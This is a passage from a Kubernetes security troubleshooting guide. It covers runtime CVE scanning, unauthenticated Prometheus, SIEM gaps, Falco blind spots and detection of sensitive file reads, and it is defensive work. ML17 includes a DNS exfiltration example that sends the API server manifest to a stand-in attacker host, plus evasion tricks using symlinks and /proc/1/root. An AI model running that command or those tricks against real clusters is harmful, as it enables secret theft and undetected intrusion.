4. Monitor DNS queries for cross-namespace lookups CoreDNS metrics: alert on queries for <service>.<namespace>.svc.cluster.local where the source namespace and target namespace have no defined communication policy. This is an early indicator of lateral movement reconnaissance.
5. Establish traffic volume baselines and alert on anomalies Hubble + Prometheus: rate(hubble_flows_total{destination_namespace="payments"}[5m]). If the rate is normally 0 and suddenly spikes, trigger an alert. Volume anomalies catch exfiltration even if the destination is "allowed."
💡 Personal Advice:
East-west traffic is your biggest blind spot — and the attacker's primary path. 90% of attack traffic moves laterally (east-west) between pods — not through the Ingress. If you're only monitoring north-south traffic, you're blind to 90% of the attack. Hubble gives you complete east-west visibility. Deploy it before you need it.
NetworkPolicy is free microsegmentation. Default-deny between namespaces costs nothing to implement (just YAML) and prevents the most common lateral movement pattern. Combine with flow monitoring to detect and block internal reconnaissance before the attacker reaches their target.

📌 ML13–ML16: Runtime CVE Monitoring, Prometheus Auth, SIEM & Sidecar Deployment

ML13
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML13
No Runtime CVE Monitoring — New Vulnerabilities in Running Images Undetected

🔍 Symptom: The anihpj-api:v1.2 image was scanned at build time (3 months ago) — zero CRITICAL CVEs. Since then, CVE-2024-12345 (CRITICAL, remote code execution in OpenSSL) was disclosed — and it affects the version of OpenSSL in anihpj-api:v1.2. But there's no runtime vulnerability scanning. The image has been running in production for 3 months with a KNOWN CRITICAL CVE — and no one knows. Build-time scanning is a point-in-time check. CVEs are discovered DAILY. Without continuous runtime scanning, yesterday's clean image is today's vulnerable image.

  trivy image anihpj/jobpost-api:v1.2   # Scan done 3 months ago
  Total: 15 (CRITICAL: 0, HIGH: 2, MEDIUM: 8, LOW: 5)   ← Was clean!

  trivy image anihpj/jobpost-api:v1.2   # Same scan TODAY
  Total: 26 (CRITICAL: 3, HIGH: 8, MEDIUM: 10, LOW: 5)   ← NOW CRITICAL!
  ┌──────────────────┬──────────┬───────────┬──────────────────────┐
  │ CVE-2024-12345   │ CRITICAL │ openssl   │ Remote Code Execution│
🔴5 Most Likely Causes
  1. No runtime vulnerability scanning: Images are scanned ONCE at build time. There's no periodic rescan of images running in production. CVEs discovered after the initial scan are invisible. Runtime scanning is a separate concern from CI scanning — both are needed.
  2. No integration with CVE feed for continuous monitoring: Tools like Trivy Operator, Anchore, or Clair can monitor running images and compare against the latest CVE databases. No such tool is deployed — there's no automated "this image now has a new CRITICAL CVE" notification.
  3. No SLA for responding to newly discovered CVEs: When a CVE is discovered in a running image, there's no defined response timeline. The team doesn't know: "how quickly must we patch a CRITICAL CVE discovered in production?" No SLA = no urgency = no action.
  4. CVE scanner database not updated: Trivy/Grype rely on local CVE databases that must be periodically refreshed. The scanner's database was last updated 3 months ago — it's scanning with OLD vulnerability data. Even if runtime scanning existed, it wouldn't catch new CVEs because the database is stale.
  5. Only application dependencies scanned — not OS packages: The build-time scan only checked pip packages. The CRITICAL CVE is in OpenSSL (an OS package installed via apt). OS-level packages were excluded from scanning because the focus was on "application dependencies."
🟡5 Less Likely Causes
  1. Trivy Operator not deployed: Trivy Operator (or equivalent) continuously scans running images and creates VulnerabilityReports. Without it, runtime CVE monitoring requires manual cronjobs — which are rarely set up or maintained.
  2. Vulnerability report generated but not actioned: Trivy Operator creates reports. But no one reviews them. The report sits in the cluster as a CRD — no alert, no dashboard, no notification. Data exists but is invisible to decision-makers.
  3. False sense of security from CI scanning: "We scan all images in CI — we're covered." The team doesn't realize that CI scanning is a POINT-IN-TIME check. An image that passes CI scanning can become critically vulnerable the next day — without any notification.
  4. Vulnerability fatigue — too many CVEs to action: Runtime scanning reveals 500+ CVEs across all running images. The team is overwhelmed. Instead of triaging by severity and exploitability, they ignore the entire report. Focus on CRITICAL + exploitable CVEs — triage the rest.
  5. No fix available for the CVE: A CVE is disclosed but the upstream maintainer hasn't released a patch yet. The team accepts the risk and waits — but never sets a reminder to check for the patch. The CVE remains open indefinitely because no one tracks "waiting for upstream fix."
🟣5 New Cluster Causes
  1. Trivy Operator not in default toolchain: CI has Trivy. But runtime scanning requires Trivy Operator — a separate deployment. The team has CI scanning and assumes "that's enough."
  2. No vulnerability management process: No defined process for: discover CVE → assess impact (is it exploitable in our context?) → prioritize → remediate (rebuild image) → verify. Without a process, CVEs are discovered and forgotten.
  3. No CVE notification feed: The security team doesn't subscribe to CVE announcements. They only discover vulnerabilities when they happen to scan. Proactive notification (NVD feeds, vendor advisories) would give them days of advance warning.
  4. Images rebuilt quarterly — too slow for critical CVEs: The image rebuild cycle is 90 days. A CRITICAL CVE disclosed on day 1 waits 89 days for the next rebuild window. Critical CVEs need out-of-band emergency rebuilds (within 24-72 hours).
  5. No admission control based on CVE age: Kyverno could block pods where the image has a CVE older than 30 days (for HIGH) or 7 days (for CRITICAL). No such policy — vulnerable images are deployed and left running indefinitely.
🔍 What to Look At:
kubectl get vulnerabilityreports -A 2>/dev/null | head -5 If this returns "no resources found," Trivy Operator (or equivalent) is not deployed. There's NO runtime vulnerability monitoring — CVEs discovered after build time are invisible.
trivy image anihpj/jobpost-api:v1.2 --severity CRITICAL,HIGH Rescan the running image NOW. Compare against the build-time scan. Any NEW CRITICAL or HIGH CVEs are vulnerabilities you're currently running with — and didn't know about.
trivy image --db-repository ghcr.io/aquasecurity/trivy-db --cache-dir /tmp/trivy-cache anihpj/jobpost-api:v1.2 Ensure the CVE database is up-to-date. If the scan uses a cached DB from 3 months ago, it won't detect any CVEs discovered since then.
🎯 #1 Root Cause: Images are only scanned for CVEs at build time — not continuously at runtime. CVEs are discovered daily. A build-time scan from 3 months ago is blind to 100% of CVEs disclosed since then. Running images accumulate new critical vulnerabilities without any detection or notification.
🔧 How to Solve:
1. Deploy Trivy Operator for continuous runtime scanning kubectl apply -f https://raw.githubusercontent.com/aquasecurity/trivy-operator/main/deploy/static/trivy-operator.yaml Trivy Operator scans all running images daily and creates VulnerabilityReport CRDs. New CVEs appear in reports within 24 hours of disclosure. Integrate with Prometheus for alerting.
2. Set up CVE notification alerting Prometheus alert: trivy_vulnerability_count{severity="CRITICAL"} > 0 for any image → PagerDuty. Every new CRITICAL CVE triggers an immediate alert. The on-call engineer triages and initiates the emergency rebuild process.
3. Define CVE response SLA CRITICAL + exploitable: rebuild within 24 hours. CRITICAL + not exploitable: rebuild within 72 hours. HIGH: rebuild within 7 days. MEDIUM: next scheduled build (14 days). LOW: next release cycle (30 days). SLA drives action.
4. Keep CVE databases current (daily refresh) Trivy Operator automatically updates its CVE database. Ensure it has network access to GitHub (ghcr.io for trivy-db) or mirror the database locally. The scan is only as current as the database — ensure it's refreshed daily.
5. Implement Kyverno policy for maximum CVE age Block pods where the image has: CRITICAL CVE >7 days old, HIGH CVE >30 days old. This enforces the SLA at admission time — you CAN'T deploy an image with an aging CRITICAL CVE.
💡 Personal Advice:
Build-time scanning is a snapshot. Runtime scanning is continuous monitoring. CI scanning says "this image had 0 CRITICAL CVEs on January 1st." Runtime scanning says "this image has 3 CRITICAL CVEs TODAY." You need both. Runtime scanning catches what CI scanning misses — the CVEs that didn't exist when you built the image. Trivy Operator is free. Deploy it today.
An SLA without enforcement is just a suggestion. If your policy says "patch CRITICAL CVEs within 24 hours" but there's no automated alert and no admission block, the policy is aspirational. Alert when a CVE is discovered. Block deployment when the SLA is exceeded. Policy + alert + enforcement = actual security improvement.
ML14
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML14
Prometheus Metrics Exposed Without Authentication — Cluster Reconnaissance

🔍 Symptom: curl http://prometheus.anihpj.internal:9090/api/v1/query?query=container_memory_usage_bytes returns memory usage for ALL containers — without any authentication. Prometheus is deployed without TLS, without authentication, and without NetworkPolicy restricting access. Any pod in the cluster (or anyone who reaches the internal network) can query Prometheus and extract: pod names, namespaces, resource usage, Service endpoints, request rates, error counts — a complete operational profile of every application. Attackers use this for reconnaissance: "which services are active? What's the traffic pattern? Where are the databases?"

  curl -s http://prometheus.monitoring:9090/api/v1/query?query=kube_pod_info | jq '.data.result[] | .metric | {pod, namespace, node}'
  {"pod":"anihpj-db-0","namespace":"anihpj","node":"worker-3"}
  {"pod":"payment-svc-abc","namespace":"payments","node":"worker-1"}   ← COMPLETE POD INVENTORY!

  curl -s http://prometheus.monitoring:9090/api/v1/label/__name__/values | jq '.data[]' | head -20
  # All metrics exposed — application internals, DB queries, cache hit rates
🔴5 Most Likely Causes
  1. Prometheus deployed without authentication: Default Prometheus installation has NO authentication. Anyone who can reach port 9090 can query ALL metrics. Prometheus supports: basic auth, OAuth2 proxy, or mTLS — but none are configured.
  2. Prometheus Service exposed internally without NetworkPolicy: The prometheus Service is ClusterIP but has no NetworkPolicy restricting which pods can access it. Any compromised pod can query Prometheus and map the entire cluster. NetworkPolicy should restrict Prometheus access to Grafana and monitoring tools only.
  3. No TLS on Prometheus endpoints: Metrics are transmitted in plaintext. Anyone performing network sniffing (from a compromised pod with hostNetwork: true or a compromised node) can capture all Prometheus queries and responses — including application-specific metrics that reveal business logic.
  4. Metrics contain sensitive data: Application developers exported custom metrics with sensitive labels: http_requests_total{endpoint="/api/users", user_id="123"}. Metrics now contain PII and internal API paths. Prometheus is the new data leak vector.
  5. Prometheus node-exporter exposes host-level metrics: Node-exporter metrics include: running processes, disk usage, network connections, and kernel parameters. An attacker querying node-exporter gets a complete node-level reconnaissance without running a single command on the node.
🟡5 Less Likely Causes
  1. Prometheus federation exposes metrics to untrusted clusters: Federation is configured to share metrics with a "central" Prometheus — but the federation endpoint has no auth. Any Prometheus instance can pull ALL metrics from your cluster. Federation must require mutual TLS and authentication.
  2. Grafana dashboards publicly accessible with no auth: Grafana is exposed via Ingress/LoadBalancer without login. The default "Anonymous access" is enabled. Anyone who finds the Grafana URL sees all dashboards — a visual representation of your entire infrastructure.
  3. Alertmanager exposed without authentication: Alertmanager's API (/api/v2/alerts) shows all firing alerts. Attackers can see which alerts are configured — and craft attacks that specifically AVOID triggering those alerts. They silence alerts via the API before attacking.
  4. Prometheus remote-write endpoint abused: An attacker sends fake metrics to the remote-write endpoint — poisoning your monitoring data. Dashboards show false information. Alerts fire on fake data. The monitoring system becomes an attack vector.
  5. Prometheus TSDB snapshots accessible: The TSDB (time-series database) admin API allows taking snapshots: POST /api/v2/admin/tsdb/snapshot. Without auth, an attacker can download the ENTIRE metrics history — months of operational data, traffic patterns, and business metrics.
🟣5 New Cluster Causes
  1. Prometheus installed with default Helm values: The kube-prometheus-stack Helm chart with default values has no authentication. The team never configured auth — the default install was the production install.
  2. Monitoring considered "internal tool" — no security review: The security team reviewed application endpoints but not monitoring infrastructure. Prometheus, Grafana, and Alertmanager were not in scope for security assessment.
  3. No NetworkPolicy for monitoring namespace: No policy restricting access to port 9090 (Prometheus), 3000 (Grafana), 9093 (Alertmanager). Any pod can connect to monitoring infrastructure.
  4. Metrics collection seen as "just ops data": The team doesn't realize that metrics are sensitive: pod inventory, traffic patterns, error rates, resource usage. Attackers use this for reconnaissance — the same way they use nmap and kubectl.
  5. No Prometheus security hardening guide followed: Prometheus documentation includes security recommendations (TLS, auth, NetworkPolicy). The team never read the security docs — they followed the "getting started" guide which skips security for simplicity.
🔍 What to Look At:
curl -s http://prometheus.monitoring:9090/api/v1/query?query=up If this returns data without authentication, Prometheus is wide open. Any pod in the cluster can query all metrics and map your entire infrastructure.
kubectl get networkpolicy -n monitoring Check if NetworkPolicies restrict Prometheus access. If no policies exist, every pod in the cluster can reach Prometheus on port 9090.
kubectl get svc prometheus -n monitoring -o yaml | grep -A5 "annotations" Check for auth-related annotations (nginx.ingress auth, OAuth2 proxy). Absence means no authentication is configured for Prometheus endpoints.
🎯 #1 Root Cause: Prometheus is deployed without authentication, TLS, or NetworkPolicy restrictions. Any pod in the cluster can query all metrics — extracting pod inventory, namespace structure, resource usage patterns, and application-specific metrics — providing attackers with complete operational reconnaissance without triggering any security alerts.
🔧 How to Solve:
1. Add authentication to Prometheus Deploy OAuth2 Proxy in front of Prometheus: require valid OIDC token to query metrics. Or use Prometheus' built-in basic auth with --web.config.file containing basic_auth_users. Never expose Prometheus without authentication.
2. Enforce NetworkPolicy for monitoring namespace Only allow: Grafana → Prometheus:9090, Alertmanager → Prometheus:9090, kube-state-metrics → Prometheus (scrape). Default-deny all other traffic to Prometheus, Grafana, and Alertmanager.
3. Enable TLS on Prometheus --web.config.file=/etc/prometheus/web-config.yml Configure TLS certificates for Prometheus endpoints. All metrics queries are encrypted in transit. Prevents network sniffing of metrics data from compromised pods.
4. Review metrics for sensitive data exposure Audit all custom application metrics. Remove labels containing: user IDs, email addresses, internal hostnames, API keys, tokens. Metrics should be aggregated — never include PII or secrets as label values.
5. Restrict Prometheus admin API Disable admin API if not needed (--web.enable-admin-api=false). The snapshot, TSDB clean, and reload endpoints should require authentication and be restricted to cluster administrators.
💡 Personal Advice:
Your monitoring system is an attacker's reconnaissance platform. Prometheus knows every pod, every namespace, every service, every request pattern, every error. If it's unauthenticated, an attacker doesn't need kubectl — they just need curl. Lock down Prometheus with the same rigor as your API server. Auth + TLS + NetworkPolicy = minimum viable security for monitoring infrastructure.
Grafana anonymous access is ON by default. Turn it OFF. The default Grafana Helm chart allows anonymous access. Anyone who finds the URL sees every dashboard. Change GF_AUTH_ANONYMOUS_ENABLED=false and require login. This is a 1-line config change that prevents a massive information leak.
ML15
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML15
No Centralized SIEM — Logs Scattered Across Systems, No Correlation

🔍 Symptom: Container logs are in Elasticsearch. Audit logs are on the control plane node disk. Falco alerts go to Slack. Network flow logs don't exist. Kubelet logs are in journald. When a security incident occurs, the investigator must manually query 5 different systems across 3 different interfaces — with no correlation between them. A reverse shell was detected by Falco (Slack) but the investigator can't see: which container logs correspond to that timestamp? What audit events occurred around the same time? What network flows were active? The data EXISTS — but it's siloed. Incident investigation takes days instead of minutes because there's no unified view.

  # Incident investigator's workflow — 5 separate systems:
  1. Slack: search for Falco alert "Reverse shell anihpj-api 03:12:04"
  2. SSH to cp-node-1: grep audit.log for 03:12:00-03:15:00
  3. Elasticsearch: search container logs for "anihpj-api" around 03:12
  4. Hubble UI: check network flows for anihpj-api (if Hubble exists)
  5. SSH to worker-3: journalctl -u kubelet --since "03:00" --until "03:30"
  # Time to correlate: 2+ hours. Time to respond: NEXT DAY.
🔴5 Most Likely Causes
  1. No centralized SIEM (Security Information and Event Management): Logs, alerts, metrics, and events from multiple sources are not aggregated into a single platform. Each data source lives in its own silo — requiring separate tools, separate queries, and separate mental models to investigate.
  2. No log correlation across data sources: Even if all data is in Elasticsearch, different data types use different index patterns, different field names, and different timestamp formats. "Reverse shell at 03:12:04 in anihpj-api" should automatically surface: container logs, audit events, network flows, and kubelet logs around 03:12 — but there's no correlation logic.
  3. Incident investigation is 100% manual: No SOAR (Security Orchestration, Automation, and Response) playbook. No automated evidence collection. The investigator manually runs commands across 5 systems — this is slow, error-prone, and incomplete. Automation can collect all evidence in seconds.
  4. Timestamps are inconsistent across systems: Audit logs use RFC3339. Container logs use the Docker/CRI timestamp format. Falco uses epoch milliseconds. Kubelet uses syslog format. The investigator must convert timestamps before correlating — adding friction to an already slow process.
  5. No unified alerting dashboard: Falco alerts go to Slack. Prometheus alerts go to PagerDuty. Audit log anomalies are emailed. The investigator has alerts coming from 3 different channels — no single pane of glass shows all security events in chronological order.
🟡5 Less Likely Causes
  1. SIEM deployed but not configured for Kubernetes data sources: Splunk/Elastic is deployed but only ingests application logs. Kubernetes-specific data (audit logs, Falco alerts, Hubble flows) were never onboarded because "no one knew the schema."
  2. Data retention mismatch between systems: Container logs: 7 days. Audit logs: 30 days. Falco alerts: 90 days. When investigating an incident from 14 days ago, container logs are already deleted — critical evidence is missing. All security data should have consistent retention (minimum 30 days).
  3. Too much data — queries time out: The SIEM has 50 TB of logs. A query across all indices times out after 30 seconds. The investigator can't search broadly — they must narrow to specific indices and time ranges, potentially missing evidence outside the guessed window.
  4. No pre-built dashboards for Kubernetes security: The SIEM has data but no dashboards showing: "all security events in namespace X in the last 24 hours," "attack chain: Falco alert → audit event → network flow." Dashboards provide at-a-glance situational awareness that raw queries can't.
  5. Access to SIEM restricted to security team only: The ops team discovers an anomaly but can't access the SIEM to investigate. They file a ticket with security → security investigates next business day → attacker has 72 hours of unhindered access. Self-service SIEM access for ops speeds investigation.
🟣5 New Cluster Causes
  1. SIEM not in initial infrastructure plan: The cluster was set up with monitoring (Prometheus) and logging (EFK). SIEM was considered "enterprise" and not needed for a startup. As the company grew, the gap remained.
  2. Logging strategy is "collect everything — figure out SIEM later": Logs are collected but stored in cheapest possible storage (S3 without indexing). The assumption was "we'll build the SIEM later." Later never came — logs exist but are not searchable.
  3. Security team separate from platform team: The platform team deployed monitoring tools. The security team needs SIEM capabilities. Neither team has the mandate or budget to integrate the two. The gap between "ops monitoring" and "security monitoring" remains unfilled.
  4. No incident response plan requiring SIEM: The IR plan is: "investigate manually." No one has defined: "for a Kubernetes compromise, we need X, Y, Z data sources in a unified view." Without requirements, SIEM is never procured.
  5. Open-source SIEM (Wazuh/Security Onion) not evaluated: The team assumes SIEM = Splunk = $100K/year. They don't know that Wazuh and Elastic Security provide SIEM capabilities for free — and integrate with Kubernetes audit logs and Falco.
🔍 What to Look At:
kubectl get pods -A | grep -iE "elastic|splunk|wazuh|securityonion" Check if a SIEM is deployed in the cluster. If no SIEM pods exist, security data is scattered across separate systems with no unified view.
Manual correlation test: pick a Falco alert timestamp. Can you find the corresponding container logs, audit events, and network flows within 2 minutes? If it takes longer than 2 minutes, your SIEM is insufficient for incident response.
kubectl get networkpolicy -n monitoring -o yaml | grep -E "elastic|splunk|siem" Check if logs are being forwarded to an external SIEM. Look for fluentd/fluent-bit outputs to Splunk HEC, Elasticsearch, or S3 (for SIEM ingestion).
🎯 #1 Root Cause: No centralized SIEM aggregates security data from all sources (Falco, audit logs, container logs, network flows, kubelet logs). Incident investigation requires manual correlation across 5+ separate systems — turning a 10-minute investigation into a multi-day forensic exercise while the attacker continues to operate.
🔧 How to Solve:
1. Deploy a SIEM that ingests all Kubernetes security data Options: Elastic Security (free, built on Elasticsearch), Wazuh (open-source XDR + SIEM), Splunk (commercial). Ingest: Falco alerts (via webhook), audit logs (fluentd), container logs, Hubble flows, and kubelet logs. One platform, one query language, one dashboard.
2. Normalize timestamps and field names across sources Use Elasticsearch ingest pipelines or Logstash to normalize: all timestamps → @timestamp (ISO 8601). All pod names → kubernetes.pod.name. All namespaces → kubernetes.namespace. Consistent schema enables cross-source correlation.
3. Build pre-built correlation dashboards Dashboard: "Pod Security Timeline" — for a given pod, show: Falco alerts (timeline), container logs (timeline), audit events (timeline), network flows (timeline). All events for one pod in one view. Investigation time drops from hours to minutes.
4. Create automated investigation playbooks (SOAR) When Falco CRITICAL alert fires → automatically: query container logs ±5 min, query audit events ±5 min, query network flows ±5 min, collect pod manifest, snapshot process list. The investigator opens a pre-populated case with ALL evidence collected — no manual queries needed.
5. Set consistent retention for all security data All security data: 30 days hot (SIEM), 90 days warm, 365 days cold. Never delete security data before 30 days. Consistent retention means an investigation 3 weeks after the incident still has ALL evidence available.
💡 Personal Advice:
Without a SIEM, incident investigation is archaeology — digging through separate layers hoping to find evidence. You have the data. It's scattered across 5 systems. The attacker is still in your cluster while you're SSH-ing into nodes to grep logs. A SIEM correlates everything in one place. The 2-hour investigation becomes a 2-minute investigation. The attacker's window of operation shrinks from days to minutes.
Elastic Security is free and integrates with everything. If you already have Elasticsearch for container logs, you're 80% of the way to a SIEM. Enable Elastic Security (free), ingest Falco alerts and audit logs, create correlation rules. You don't need a $100K Splunk license — the foundation is already in your cluster.
ML16
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML16
Falco Sidecar Not Deployed in Critical Namespaces — Blind Spots

🔍 Symptom: Falco is deployed as a DaemonSet — it monitors ALL pods across all namespaces. But the payments namespace (PCI data) has a toleration that prevents Falco from running on its dedicated nodes: node-role.kubernetes.io/pci: NoSchedule. The payments nodes have NO Falco monitoring. An attacker who compromises payment-svc in the payments namespace can operate without any runtime detection — no shell alerts, no crypto mining detection, no reverse shell detection. The most security-critical namespace has the LEAST runtime monitoring because Falco can't be scheduled on its tainted nodes.

  kubectl get pods -n falco -o wide | grep "pci-worker"
  # No Falco pods on pci-worker nodes — taint prevents scheduling!

  kubectl describe node pci-worker-1 | grep Taint
  Taints: node-role.kubernetes.io/pci=:NoSchedule   ← FALCO CAN'T RUN HERE!
🔴5 Most Likely Causes
  1. Node taints prevent Falco DaemonSet from scheduling: Nodes with taints (NoSchedule, NoExecute) reject pods without matching tolerations. The Falco DaemonSet has no tolerations for the PCI node taint. Falco pods cannot be scheduled on these nodes — leaving them completely unmonitored.
  2. Falco tolerations not configured for all node roles: The Falco Helm chart has default tolerations for node-role.kubernetes.io/master and node-role.kubernetes.io/control-plane — but NOT for custom taints like node-role.kubernetes.io/pci or CriticalAddonsOnly. Custom taints create monitoring blind spots.
  3. Dedicated node pools for compliance workloads not monitored: PCI/HIPAA workloads run on dedicated nodes for compliance isolation. But the monitoring infrastructure wasn't configured to run on these nodes. Compliance isolation accidentally created security monitoring gaps.
  4. Falco in user-space mode on tainted nodes:
    5. Even if Falco can't run as a DaemonSet, it could run as a sidecar in critical pods. But Falco sidecar injection is not configured — the critical pods run entirely without runtime detection.
  5. Resource constraints on compliance nodes prevent Falco: PCI nodes are sized exactly for payment workloads — no overhead for monitoring. The Falco pod would exceed resource requests and be rejected by the scheduler. Node sizing didn't account for security tooling.
🟡5 Less Likely Causes
  1. Falco eBPF probe incompatible with node kernel: The PCI nodes run a hardened kernel (e.g., RHEL with FIPS mode) that doesn't support eBPF or blocks specific eBPF helpers. Falco installs but the probe fails to load — it runs without syscall monitoring. No events are generated.
  2. NetworkPolicy blocks Falco from forwarding alerts: Falco pods CAN schedule on PCI nodes, but egress NetworkPolicy blocks connections to Falcosidekick (alert forwarder). Falco detects threats but can't send alerts — detection without notification is useless.
  3. Compliance policy prohibits kernel-level tools: The PCI compliance policy explicitly prohibits kernel modules and eBPF probes on PCI nodes — the exact mechanisms Falco uses. Security tooling is blocked by security policy — creating a paradoxical gap where compliance prevents security monitoring.
  4. PCI namespace excluded from Falco rules: Falco is deployed but rules have and k8s.ns.name != "payments" — intentionally excluding PCI namespaces because "those workloads don't change." The exclusion creates a blind spot exactly where attackers target (financial data).
  5. Monitoring gap known but accepted as "risk accepted": The team documented "Falco cannot monitor PCI nodes due to taint" and marked it as "risk accepted." The risk was accepted without a compensating control (Falco sidecar, auditd, network monitoring).
🟣5 New Cluster Causes
  1. Dedicated node pools created without updating DaemonSets: PCI nodes were added post-initial-setup. DaemonSet configurations (Falco, fluent-bit, node-exporter) were not updated to include the new taint tolerations.
  2. No monitoring coverage audit: No process verifies that ALL nodes have monitoring DaemonSets running. The gap was discovered during an incident — not during proactive monitoring hygiene checks.
  3. Compliance isolation prioritized over security monitoring: The PCI nodes were isolated for compliance — but isolation also isolated them from security monitoring. The balance between compliance isolation and security visibility wasn't considered.
  4. No Falco sidecar pattern for critical pods: The team only knows Falco as a DaemonSet. They're unaware that Falco can run as a sidecar or that Falco Talon provides per-pod monitoring without node-level deployment.
  5. Node taints used as security boundary: The team relies on taints for workload isolation. But taints are a scheduling constraint — not a security boundary. Attackers who compromise a pod can still access the node's kernel — the very thing Falco monitors.
🔍 What to Look At:
kubectl get pods -n falco -o wide | awk '{print $7}' | sort -u List all nodes running Falco. Cross-reference with kubectl get nodes. Any node NOT in the Falco list is a monitoring blind spot — pods on that node have zero runtime detection.
kubectl get nodes -o json | jq '.items[] | {name: .metadata.name, taints: .spec.taints}' Check all node taints. Any taint not present in Falco's DaemonSet tolerations means Falco cannot run on that node.
kubectl get ds falco -n falco -o yaml | grep -A10 tolerations Review Falco's tolerations. Ensure they cover ALL node taints in the cluster. Missing toleration = missing monitoring on that node group.
🎯 #1 Root Cause: Falco DaemonSet lacks the necessary tolerations to run on all node groups — particularly PCI/compliance nodes with custom taints. The most security-critical nodes (handling financial data) have NO runtime threat detection, creating a blind spot exactly where attackers target.
🔧 How to Solve:
1. Add tolerations for all node taints to Falco DaemonSet tolerations: - key: node-role.kubernetes.io/pci operator: Exists effect: NoSchedule Update Falco Helm values with tolerations for every node taint in your cluster. Every node must run Falco — no exceptions.
2. Deploy Falco as a sidecar in critical namespaces as backup If DaemonSet deployment fails on a node, the Falco sidecar in critical pods provides per-pod runtime detection. Defense-in-depth: DaemonSet for cluster-wide coverage + sidecar for critical pod coverage.
3. Run continuous monitoring coverage audits CronJob: compare kubectl get nodes with kubectl get pods -n falco -o wide. Alert if any node has no Falco pod. Monitoring coverage must be 100% — every node, every namespace, every pod.
4. Include monitoring overhead in node sizing PCI node sizing: payment workload + 200m CPU/256Mi RAM for Falco + 100m/128Mi for fluent-bit + 50m/64Mi for node-exporter. Monitoring is not "overhead" — it's an essential service that must be provisioned.
5. If kernel-level monitoring is impossible, use userspace alternatives If kernel modules/eBPF are blocked by compliance: use auditd (kernel audit subsystem), Falco in userspace mode with pdig, or network-level monitoring (Hubble). Compensating controls when kernel monitoring is unavailable.
💡 Personal Advice:
Your most critical workloads need the MOST monitoring — not the least. PCI, HIPAA, and PII workloads are the attacker's primary targets. If they're on dedicated nodes with no Falco, attackers have a safe haven — they can operate undetected in the most sensitive part of your infrastructure. Monitoring coverage must be 100%. Every node. Every namespace. Every pod. No exceptions for compliance.
When you add a new node group, update ALL DaemonSets. New node group = new taints = monitoring DaemonSets can't schedule. Make "update DaemonSet tolerations" a mandatory step in your node group provisioning checklist. Automate it with Infrastructure as Code — ensure every DaemonSet has tolerations: [{operator: Exists}] to tolerate ALL taints.

📌 ML17–ML20: Sensitive Files, Escape Detection, IR Runbooks & Compliance

ML17
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML17
No Runtime Policy for Sensitive File Access — Secrets Read Undetected

🔍 Symptom: An attacker compromised anihpj-api and ran cat /etc/kubernetes/manifests/kube-apiserver.yaml (reading the API server static pod manifest — containing etcd endpoints and flags). They also read /var/run/secrets/kubernetes.io/serviceaccount/token and /etc/ssl/certs/ca-certificates.crt. Falco detected NONE of these file reads because the rules for "sensitive file access" were not enabled or not configured for these paths. The attacker gathered critical infrastructure information — API server configuration, ServiceAccount tokens, and CA certificates — without triggering a single alert.

  kubectl exec anihpj-api -n anihpj -- cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep etcd
  --etcd-servers=https://10.0.0.1:2379   ← ATTACKER NOW KNOWS ETCD ENDPOINTS!

  kubectl logs -n falco -l app=falco --tail=100 | grep -i "sensitive\|shadow\|kubernetes"
  # No alerts — Falco not monitoring these sensitive file paths!
🔴5 Most Likely Causes
  1. Falco rules for sensitive file access not enabled: Falco has rules: Read sensitive file untrusted, Read ssh information, Read Environment Variable from /proc files. These rules monitor reads of /etc/shadow, /proc/<pid>/environ, and SSH keys. But Kubernetes-specific paths (/etc/kubernetes/, ServiceAccount tokens, static pod manifests) are not in the default sensitive file list.
  2. Custom sensitive file paths not defined in Falco rules: The default Falco rules don't know about Kubernetes internals. The team never added custom rules for: /etc/kubernetes/manifests/, /var/lib/kubelet/, /etc/kubernetes/pki/, /var/run/secrets/kubernetes.io/. These are Kubernetes-specific sensitive paths that attackers target.
  3. No file access audit on hostPath-mounted Kubernetes directories: If a pod has hostPath: /etc/kubernetes (or manages to access it via container escape), reads of these files should trigger CRITICAL alerts. But no auditd rules or Falco rules monitor hostPath access to Kubernetes directories.
  4. Read-only access doesn't trigger "write" rules: Most Falco rules trigger on WRITES to sensitive directories. The attacker only READ files — and read rules are often disabled because they're too noisy (legitimate applications read config files). But reading /etc/kubernetes/ is NEVER legitimate from a container.
  5. No distinction between "container process reads its own files" vs "reads host files": Falco doesn't distinguish between "reading a file inside the container" and "reading a file on the host via hostPath." All reads look the same. Custom rules must flag reads of paths that only exist on the host (e.g., /etc/kubernetes/).
🟡5 Less Likely Causes
  1. ServiceAccount token read by legitimate application: Some apps legitimately read the SA token to call the Kubernetes API. The attacker's token read looks identical to legitimate behavior — making rule-based detection difficult. Behavioral anomaly detection (token read at unusual time/by unusual process) is needed.
  2. Sensitive files accessed via symlink: The attacker created a symlink from /tmp/foo → /etc/kubernetes/manifests/kube-apiserver.yaml. Falco sees the read as accessing /tmp/foo — not the sensitive file. Path-based rules are bypassed by symlinks.
  3. Files read via /proc/<pid>/root: The attacker accessed host files through the /proc filesystem: /proc/1/root/etc/kubernetes/manifests/. Falco sees the read as /proc/1/root/etc/... — a path NOT in the sensitive file list.
  4. Sensitive data in memory, not on disk: The attacker read sensitive data from /proc/<pid>/mem — directly accessing process memory. No file is read — the data is extracted from RAM. Falco's filesystem rules don't detect memory access.
  5. Sensitive data exfiltrated via DNS tunneling: Instead of reading files, the attacker exfiltrates data via DNS queries (dig @attacker.com $(cat /etc/kubernetes/manifests/kube-apiserver.yaml | base64)). No file read event because the data is piped directly to DNS — Falco's file read rules don't apply.
🟣5 New Cluster Causes
  1. Kubernetes-specific sensitive paths not in Falco defaults: Falco ships with Linux-generic sensitive paths (/etc/shadow, /root/.ssh/). Kubernetes paths must be added manually — and most teams never customize the default rules.
  2. No threat model for post-exploitation reconnaissance: The team's threat model stops at "attacker gains access." Post-exploitation activities (reading configs, enumerating the cluster) are not considered — no detection rules for them.
  3. No file integrity monitoring on Kubernetes directories: AIDE/Tripwire/auditd not configured to monitor: /etc/kubernetes/, /var/lib/kubelet/, /etc/kubernetes/pki/. Reads and modifications of these directories are invisible.
  4. Falco rules managed as "set and forget": The default rules were deployed once and never customized. The team doesn't know they can (and should) add custom rules for their specific environment and sensitive paths.
  5. No data classification to identify sensitive paths: The team hasn't identified which files contain sensitive data. Without classification, they can't create monitoring rules. Data classification drives monitoring requirements.
🔍 What to Look At:
